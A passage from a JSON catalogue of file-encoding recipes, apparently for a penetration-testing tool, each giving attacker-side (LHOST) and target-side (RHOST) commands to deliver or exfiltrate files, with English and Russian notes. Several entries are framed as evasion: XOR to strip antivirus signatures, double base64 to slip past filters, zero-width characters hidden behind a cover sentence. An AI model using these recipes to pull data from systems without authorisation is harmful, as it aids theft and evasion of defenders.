    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-win-tar-deliver",
    "title": "tar.gz + Base64 (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "windows",
    "direction": "deliver",
    "channel": "encoding",
    "family": "archive",
    "priority": 20,
    "source": "10",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "tar czf - \"{lhostpath}/{file}\" | base64 -w0 > \"{lhostpath}/{file}.tar.gz.b64\""
      },
      {
        "side": "rhost",
        "shell": "powershell",
        "text": "$b=[Convert]::FromBase64String((Get-Content -Raw '{remotefile}.tar.gz.b64'));[IO.File]::WriteAllBytes('{remotefile}.tar.gz',$b);tar -xzf '{remotefile}.tar.gz' -C '{remote}'"
      }
    ],
    "requires": [
      "tar",
      "base64",
      "PowerShell"
    ],
    "note": {
      "en": "Windows 10 1803+ ships bsdtar; the path is packed on the Linux side for delivery. Encode on LHOST, send the .tar.gz.b64 file, decode on RHOST.",
      "ru": "В Windows 10 1803+ есть bsdtar; при доставке архив создаётся на Linux. Кодируйте на LHOST, передайте файл .tar.gz.b64 и декодируйте на RHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-uuencode-deliver",
    "title": "uuencode (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "encoding",
    "family": "archive",
    "priority": 20,
    "source": "10",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "uuencode \"{lhostpath}/{file}\" \"{file}\" > \"{lhostpath}/{file}.uu\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "uudecode -o \"{remotefile}\" \"{remotefile}.uu\""
      }
    ],
    "requires": [
      "uuencode",
      "uudecode"
    ],
    "note": {
      "en": "Classic Unix text encoding with the original filename embedded. Encode on LHOST, send the .uu file with any transport, then decode on RHOST.",
      "ru": "Классическое Unix-кодирование с именем исходного файла внутри. Кодируйте на LHOST, передайте файл .uu любым транспортом и декодируйте на RHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-xz-deliver",
    "title": "xz + Base64 (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "encoding",
    "family": "compression",
    "priority": 20,
    "source": "10",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "xz -9 -c \"{lhostpath}/{file}\" | base64 -w0 > \"{lhostpath}/{file}.xz.b64\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "base64 -d \"{remotefile}.xz.b64\" | xz -d > \"{remotefile}\""
      }
    ],
    "requires": [
      "xz",
      "base64"
    ],
    "note": {
      "en": "Best ratio of the classic compressors, but slower than gzip. Encode on LHOST, send the .xz.b64 file with any transport, then decode on RHOST.",
      "ru": "Лучшее сжатие среди классических компрессоров, но медленнее gzip. Кодируйте на LHOST, передайте файл .xz.b64 любым транспортом и декодируйте на RHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-aes-deliver",
    "title": "AES-256 + Base64 (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "encoding",
    "family": "obfuscation",
    "priority": 30,
    "source": "10",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "openssl enc -aes-256-cbc -pbkdf2 -base64 -pass pass:'{rhost_pass}' -in \"{lhostpath}/{file}\" -out \"{lhostpath}/{file}.enc\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "openssl enc -d -aes-256-cbc -pbkdf2 -base64 -pass pass:'{rhost_pass}' -in \"{remotefile}.enc\" -out \"{remotefile}\""
      }
    ],
    "requires": [
      "openssl"
    ],
    "note": {
      "en": "Password-based AES with base64 armor. CBC without a MAC does not prove integrity, so compare hashes. Encode on LHOST, send the .enc file with any transport, then decode on RHOST.",
      "ru": "AES с паролем и base64-обёрткой. CBC без MAC не подтверждает целостность, поэтому сравните hash. Кодируйте на LHOST, передайте файл .enc любым транспортом и декодируйте на RHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-zstd-deliver",
    "title": "zstd + Base64 (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "encoding",
    "family": "compression",
    "priority": 30,
    "source": "10",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "zstd -19 -c \"{lhostpath}/{file}\" | base64 -w0 > \"{lhostpath}/{file}.zst.b64\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "base64 -d \"{remotefile}.zst.b64\" | zstd -d > \"{remotefile}\""
      }
    ],
    "requires": [
      "zstd",
      "base64"
    ],
    "note": {
      "en": "Modern balance: better than gzip and much faster than xz. Encode on LHOST, send the .zst.b64 file with any transport, then decode on RHOST.",
      "ru": "Современный баланс: лучше gzip и намного быстрее xz. Кодируйте на LHOST, передайте файл .zst.b64 любым транспортом и декодируйте на RHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-escape-exfil",
    "title": "\\\\xNN escapes (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "encoding",
    "family": "text",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "python3 -c \"import codecs,sys;sys.stdout.buffer.write(codecs.escape_encode(open(sys.argv[1],'rb').read())[0])\" \"{remotefile}\" > \"{remotefile}.esc\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "python3 -c \"import codecs,sys;sys.stdout.buffer.write(codecs.escape_decode(open(sys.argv[1],'rb').read())[0])\" \"{lhostpath}/{file}.esc\" > \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "python3"
    ],
    "note": {
      "en": "Escapes every non-printable byte as \\\\xNN. For \\\\uXXXX text use the handbook's text examples. Encode on RHOST, transfer the .esc file, decode on LHOST.",
      "ru": "Экранирует каждый непечатаемый байт как \\\\xNN. Для текста с \\\\uXXXX используйте примеры из справочника. Кодируйте на RHOST, передайте файл .esc и декодируйте на LHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-a85-exfil",
    "title": "Ascii85 (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "encoding",
    "family": "base85",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "python3 -c \"import base64,sys;sys.stdout.buffer.write(base64.a85encode(open(sys.argv[1],'rb').read()))\" \"{remotefile}\" > \"{remotefile}.a85\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "python3 -c \"import base64,sys;open(sys.argv[2],'wb').write(base64.a85decode(open(sys.argv[1],'rb').read()))\" \"{lhostpath}/{file}.a85\" \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "python3"
    ],
    "note": {
      "en": "Adobe Ascii85 alphabet, used in PDF/PostScript. Encode on RHOST, transfer the .a85 file, decode on LHOST.",
      "ru": "Алфавит Adobe Ascii85 из PDF/PostScript. Кодируйте на RHOST, передайте файл .a85 и декодируйте на LHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-base32-exfil",
    "title": "Base32 (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "encoding",
    "family": "base32",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "base32 -w0 \"{remotefile}\" > \"{remotefile}.b32\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "base32 -d \"{lhostpath}/{file}.b32\" > \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "base32"
    ],
    "note": {
      "en": "Case-insensitive alphabet, useful for channels that mangle case. Encode on RHOST, send the .b32 file with any transport, then decode on LHOST.",
      "ru": "Регистронезависимый алфавит; полезен для каналов, которые ломают регистр. Кодируйте на RHOST, передайте файл .b32 любым транспортом и декодируйте на LHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-base45-exfil",
    "title": "Base45 (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "encoding",
    "family": "base45",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "python3 -c \"import base45,sys;sys.stdout.write(base45.b45encode(open(sys.argv[1],'rb').read()).decode())\" \"{remotefile}\" > \"{remotefile}.b45\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "python3 -c \"import base45,sys;open(sys.argv[2],'wb').write(base45.b45decode(open(sys.argv[1]).read().strip()))\" \"{lhostpath}/{file}.b45\" \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "python3",
      "base45"
    ],
    "note": {
      "en": "RFC 9285 alphabet, designed for QR and text channels. Encode on RHOST, transfer the .b45 file, decode on LHOST.",
      "ru": "Алфавит RFC 9285, рассчитан на QR и текстовые каналы. Кодируйте на RHOST, передайте файл .b45 и декодируйте на LHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-base58-exfil",
    "title": "Base58 (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "encoding",
    "family": "base58",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "python3 -c \"import base58,sys;sys.stdout.write(base58.b58encode(open(sys.argv[1],'rb').read()).decode())\" \"{remotefile}\" > \"{remotefile}.b58\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "python3 -c \"import base58,sys;open(sys.argv[2],'wb').write(base58.b58decode(open(sys.argv[1]).read().strip()))\" \"{lhostpath}/{file}.b58\" \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "python3",
      "base58"
    ],
    "note": {
      "en": "Bitcoin alphabet without 0OIl. Leading zero bytes are not preserved. Encode on RHOST, transfer the .b58 file, decode on LHOST.",
      "ru": "Биткоин-алфавит без 0OIl. Ведущие нулевые байты не сохраняются. Кодируйте на RHOST, передайте файл .b58 и декодируйте на LHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-base62-exfil",
    "title": "Base62 (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "encoding",
    "family": "base62",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "python3 -c \"import base62,sys;sys.stdout.write(base62.encodebytes(open(sys.argv[1],'rb').read()))\" \"{remotefile}\" > \"{remotefile}.b62\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "python3 -c \"import base62,sys;open(sys.argv[2],'wb').write(base62.decodebytes(open(sys.argv[1]).read().strip()))\" \"{lhostpath}/{file}.b62\" \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "python3",
      "pybase62"
    ],
    "note": {
      "en": "Letters and digits only, URL-safe. Leading zero bytes may be lost. Encode on RHOST, transfer the .b62 file, decode on LHOST.",
      "ru": "Только буквы и цифры, URL-safe. Ведущие нулевые байты могут потеряться. Кодируйте на RHOST, передайте файл .b62 и декодируйте на LHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-base64-exfil",
    "title": "Base64 (exfil)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "encoding",
    "family": "base64",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "base64 -w0 \"{remotefile}\" > \"{remotefile}.b64\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "base64 -d \"{lhostpath}/{file}.b64\" > \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "base64"
    ],
    "note": {
      "en": "Universal text encoding; works over any channel that preserves ASCII. Encode on RHOST, send the .b64 file with any transport, then decode on LHOST.",
      "ru": "Универсальное текстовое кодирование; работает через любой канал, сохраняющий ASCII. Кодируйте на RHOST, передайте файл .b64 любым транспортом и декодируйте на LHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-b85-exfil",
    "title": "Base85 (RFC1924) (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "encoding",
    "family": "base85",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "python3 -c \"import base64,sys;sys.stdout.buffer.write(base64.b85encode(open(sys.argv[1],'rb').read()))\" \"{remotefile}\" > \"{remotefile}.b85\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "python3 -c \"import base64,sys;open(sys.argv[2],'wb').write(base64.b85decode(open(sys.argv[1],'rb').read()))\" \"{lhostpath}/{file}.b85\" \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "python3"
    ],
    "note": {
      "en": "Git/Mercurial Base85 alphabet. Do not mix it with Ascii85. Encode on RHOST, transfer the .b85 file, decode on LHOST.",
      "ru": "Алфавит Base85 из Git/Mercurial. Не смешивайте с Ascii85. Кодируйте на RHOST, передайте файл .b85 и декодируйте на LHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-base91-exfil",
    "title": "Base91 (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "encoding",
    "family": "base91",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "python3 -c \"import base91,sys;sys.stdout.write(base91.encode(open(sys.argv[1],'rb').read()))\" \"{remotefile}\" > \"{remotefile}.b91\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "python3 -c \"import base91,sys;open(sys.argv[2],'wb').write(base91.decode(open(sys.argv[1]).read().strip()))\" \"{lhostpath}/{file}.b91\" \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "python3",
      "base91"
    ],
    "note": {
      "en": "About 23% shorter than Base64, but less supported. Encode on RHOST, transfer the .b91 file, decode on LHOST.",
      "ru": "Примерно на 23% короче Base64, но хуже поддерживается. Кодируйте на RHOST, передайте файл .b91 и декодируйте на LHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-gzip-exfil",
    "title": "gzip + Base64 (exfil)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "encoding",
    "family": "compression",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "gzip -9 -c \"{remotefile}\" | base64 -w0 > \"{remotefile}.gz.b64\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "base64 -d \"{lhostpath}/{file}.gz.b64\" | gunzip > \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "gzip",
      "base64"
    ],
    "note": {
      "en": "Compress first, then encode. The default choice for most files. Encode on RHOST, send the .gz.b64 file with any transport, then decode on LHOST.",
      "ru": "Сначала сжатие, затем кодирование. Обычный выбор для большинства файлов. Кодируйте на RHOST, передайте файл .gz.b64 любым транспортом и декодируйте на LHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-hex-exfil",
    "title": "Hex (exfil)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "encoding",
    "family": "hex",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "xxd -p \"{remotefile}\" | tr -d '\\n' > \"{remotefile}.hex\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "xxd -r -p \"{lhostpath}/{file}.hex\" > \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "xxd"
    ],
    "note": {
      "en": "Plain hex. Twice as large as the input but very hard to break with text filters. Encode on RHOST, send the .hex file with any transport, then decode on LHOST.",
      "ru": "Обычный hex. Вдвое больше исходника, но очень устойчив к текстовым фильтрам. Кодируйте на RHOST, передайте файл .hex любым транспортом и декодируйте на LHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-html-exfil",
    "title": "HTML entities (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "encoding",
    "family": "text",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "python3 -c \"import html,sys;sys.stdout.write(html.escape(open(sys.argv[1],encoding='utf-8').read()))\" \"{remotefile}\" > \"{remotefile}.html\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "python3 -c \"import html,sys;sys.stdout.write(html.unescape(sys.stdin.read()))\" < \"{lhostpath}/{file}.html\" > \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "python3"
    ],
    "note": {
      "en": "Escapes text as HTML entities. Text files only; wrap binary data in Base64 first. Encode on RHOST, transfer the .html file, decode on LHOST.",
      "ru": "Экранирует текст как HTML-сущности. Только текстовые файлы; бинарные данные сначала оберните в Base64. Кодируйте на RHOST, передайте .html и декодируйте на LHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-qr-exfil",
    "title": "QR code (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "encoding",
    "family": "qr",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "base64 -w0 \"{remotefile}\" | qrencode -o \"{remotefile}.qr.png\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "zbarimg -q --raw \"{lhostpath}/{file}.qr.png\" | base64 -d > \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "qrencode",
      "zbarimg",
      "base64"
    ],
    "note": {
      "en": "One QR holds only a small payload; split large files into several QR images. Encode on RHOST, transfer the .qr.png file, decode on LHOST.",
      "ru": "Один QR вмещает небольшой объём; большие файлы делите на несколько QR. Кодируйте на RHOST, передайте файл .qr.png и декодируйте на LHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-qp-exfil",
    "title": "Quoted-printable (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "encoding",
    "family": "text",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "python3 -c \"import quopri,sys;quopri.encode(sys.stdin.buffer,sys.stdout.buffer,1)\" < \"{remotefile}\" > \"{remotefile}.qp\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "python3 -c \"import quopri,sys;quopri.decode(sys.stdin.buffer,sys.stdout.buffer)\" < \"{lhostpath}/{file}.qp\" > \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "python3"
    ],
    "note": {
      "en": "MIME quoted-printable (RFC 2045), useful when parsing mail. Encode on RHOST, transfer the .qp file, decode on LHOST. Quoted-printable is a text format: wrap binary data in Base64 first.",
      "ru": "MIME quoted-printable (RFC 2045), полезно при разборе почты. Кодируйте на RHOST, передайте файл .qp и декодируйте на LHOST. Quoted-printable — текстовый формат: бинарные данные сначала оберните в Base64."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-tar-exfil",
    "title": "tar.gz + Base64 (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "encoding",
    "family": "archive",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "tar czf - \"{remotefile}\" | base64 -w0 > \"{remotefile}.tar.gz.b64\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "base64 -d \"{lhostpath}/{file}.tar.gz.b64\" | tar xzf - -C \"{lhostpath}\""
      }
    ],
    "requires": [
      "tar",
      "gzip",
      "base64"
    ],
    "note": {
      "en": "Packs a file or directory into one text blob and unpacks it into the target directory. Encode on RHOST, send the .tar.gz.b64 file with any transport, then decode on LHOST.",
      "ru": "Упаковывает файл или каталог в один текстовый блок и распаковывает в каталог назначения. Кодируйте на RHOST, передайте файл .tar.gz.b64 любым транспортом и декодируйте на LHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-url-exfil",
    "title": "URL encoding (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "encoding",
    "family": "text",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "python3 -c \"import urllib.parse,sys;sys.stdout.write(urllib.parse.quote_from_bytes(sys.stdin.buffer.read(),safe=''))\" < \"{remotefile}\" > \"{remotefile}.uri\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "python3 -c \"import urllib.parse,sys;sys.stdout.buffer.write(urllib.parse.unquote_to_bytes(sys.stdin.buffer.read().decode()))\" < \"{lhostpath}/{file}.uri\" > \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "python3"
    ],
    "note": {
      "en": "Percent-encoding for URLs and HTTP parameters. Encode on RHOST, transfer the .uri file, decode on LHOST.",
      "ru": "Percent-encoding для URL и HTTP-параметров. Кодируйте на RHOST, передайте файл .uri и декодируйте на LHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-xor-exfil",
    "title": "XOR 0x42 + Base64 (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "encoding",
    "family": "obfuscation",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "python3 -c \"import base64,sys;open(sys.argv[2],'wb').write(base64.b64encode(bytes(b^0x42 for b in open(sys.argv[1],'rb').read())))\" \"{remotefile}\" \"{remotefile}.xor.b64\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "python3 -c \"import base64,sys;open(sys.argv[2],'wb').write(bytes(b^0x42 for b in base64.b64decode(open(sys.argv[1],'rb').read())))\" \"{lhostpath}/{file}.xor.b64\" \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "python3"
    ],
    "note": {
      "en": "XOR removes recognizable strings such as MZ and AV signatures; base64 keeps it text-safe. Encode on RHOST, send the .xor.b64 file with any transport, then decode on LHOST.",
      "ru": "XOR убирает узнаваемые строки вроде MZ и сигнатуры AV; base64 сохраняет текстовый вид. Кодируйте на RHOST, передайте файл .xor.b64 любым транспортом и декодируйте на LHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-zerowidth-exfil",
    "title": "Zero-width (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "encoding",
    "family": "zero",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "python3 -c \"d=open('{remotefile}','rb').read();b=''.join(f'{x:08b}' for x in d);z={chr(48):chr(0x200b),chr(49):chr(0x200c)};open('{remotefile}.zw.txt','w',encoding='utf-8').write('Quarterly report.' + ''.join(z[c] for c in b))\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "python3 -c \"t=open('{lhostpath}/{file}.zw.txt',encoding='utf-8').read();b=''.join('0' if c==chr(0x200b) else '1' for c in t if c in (chr(0x200b),chr(0x200c)));open('{lhostpath}/{file}','wb').write(bytes(int(b[i:i+8],2) for i in range(0,len(b)-7,8)))\""
      }
    ],
    "requires": [
      "python3"
    ],
    "note": {
      "en": "Hides bits as U+200B/U+200C after a short cover sentence. Do not add spaces or line breaks to the final text. Encode on RHOST, transfer the .zw.txt file, decode on LHOST.",
      "ru": "Прячет биты как U+200B/U+200C после короткого текста-прикрытия. Не добавляйте пробелы и переводы строк в финальный текст. Кодируйте на RHOST, передайте файл .zw.txt и декодируйте на LHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-win-base32-exfil",
    "title": "Base32 (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "windows",
    "direction": "exfil",
    "channel": "encoding",
    "family": "base32",
    "priority": 20,
    "source": "10",
    "steps": [
      {
        "side": "rhost",
        "shell": "powershell",
        "text": "python -c \"import base64;open(r'{remotefile}.b32','w').write(base64.b32encode(open(r'{remotefile}','rb').read()).decode())\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "base32 -d \"{lhostpath}/{file}.b32\" > \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "base32",
      "python"
    ],
    "note": {
      "en": "Windows has no native Base32; Python must be present on the target. Encode on RHOST, send the .b32 file, decode on LHOST.",
      "ru": "В Windows нет штатного Base32; на цели должен быть Python. Кодируйте на RHOST, передайте файл .b32 и декодируйте на LHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-win-base64-exfil",
    "title": "Base64 (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "windows",
    "direction": "exfil",
    "channel": "encoding",
    "family": "base64",
    "priority": 20,
    "source": "10",
    "steps": [
      {
        "side": "rhost",
        "shell": "powershell",
        "text": "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('{remotefile}'));[IO.File]::WriteAllText('{remotefile}.b64',$b)"
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "base64 -d \"{lhostpath}/{file}.b64\" > \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "base64",
      "PowerShell"
    ],
    "note": {
      "en": "PowerShell handles the Windows side, so no certutil PEM headers are involved. Encode on RHOST, send the .b64 file, decode on LHOST.",
      "ru": "На стороне Windows работает PowerShell, поэтому заголовков certutil нет. Кодируйте на RHOST, передайте файл .b64 и декодируйте на LHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-base64x2-exfil",
    "title": "Double Base64 (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "encoding",
    "family": "obfuscation",
    "priority": 20,
    "source": "10",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "base64 -w0 \"{remotefile}\" | base64 -w0 > \"{remotefile}.b64x2\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "base64 -d \"{lhostpath}/{file}.b64x2\" | base64 -d > \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "base64"
    ],
    "note": {
      "en": "Two layers survive filters that decode only once. It does not add real confidentiality. Encode on RHOST, send the .b64x2 file with any transport, then decode on LHOST.",
      "ru": "Два слоя переживают фильтры, которые декодируют только один раз. Реальной защиты не даёт. Кодируйте на RHOST, передайте файл .b64x2 любым транспортом и декодируйте на LHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-win-hex-exfil",
    "title": "Hex (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "windows",
    "direction": "exfil",
    "channel": "encoding",
    "family": "hex",
    "priority": 20,
    "source": "10",
    "steps": [
      {
        "side": "rhost",
        "shell": "powershell",
        "text": "$h=([IO.File]::ReadAllBytes('{remotefile}')|ForEach-Object{$_.ToString('x2')}) -join '';[IO.File]::WriteAllText('{remotefile}.hex',$h)"
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "xxd -r -p \"{lhostpath}/{file}.hex\" > \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "xxd",
      "PowerShell"
    ],
    "note": {
      "en": "Hex is larger but survives filters that reject base64 padding. Encode on RHOST, send the .hex file, decode on LHOST.",
      "ru": "Hex больше по размеру, но проходит фильтры, которые reject-ят padding base64. Кодируйте на RHOST, передайте файл .hex и декодируйте на LHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-win-tar-exfil",
    "title": "tar.gz + Base64 (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "windows",
    "direction": "exfil",
    "channel": "encoding",
    "family": "archive",
    "priority": 20,
    "source": "10",
    "steps": [
      {
        "side": "rhost",
        "shell": "powershell",
        "text": "tar -czf '{remotefile}.tar.gz' '{remotefile}';$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('{remotefile}.tar.gz'));[IO.File]::WriteAllText('{remotefile}.tar.gz.b64',$b)"
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "base64 -d \"{lhostpath}/{file}.tar.gz.b64\" | tar xzf - -C \"{lhostpath}\""
      }
    ],
    "requires": [
      "tar",
      "base64",
      "PowerShell"
    ],
    "note": {
      "en": "Windows 10 1803+ ships bsdtar; the path is packed on the Linux side for delivery. Encode on RHOST, send the .tar.gz.b64 file, decode on LHOST.",
      "ru": "В Windows 10 1803+ есть bsdtar; при доставке архив создаётся на Linux. Кодируйте на RHOST, передайте файл .tar.gz.b64 и декодируйте на LHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-uuencode-exfil",
    "title": "uuencode (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "encoding",
    "family": "archive",
    "priority": 20,
    "source": "10",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "uuencode \"{remotefile}\" \"{file}\" > \"{remotefile}.uu\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "uudecode -o \"{lhostpath}/{file}\" \"{lhostpath}/{file}.uu\""
      }
    ],
    "requires": [
      "uuencode",
      "uudecode"
    ],
    "note": {
      "en": "Classic Unix text encoding with the original filename embedded. Encode on RHOST, send the .uu file with any transport, then decode on LHOST.",
      "ru": "Классическое Unix-кодирование с именем исходного файла внутри. Кодируйте на RHOST, передайте файл .uu любым транспортом и декодируйте на LHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-xz-exfil",
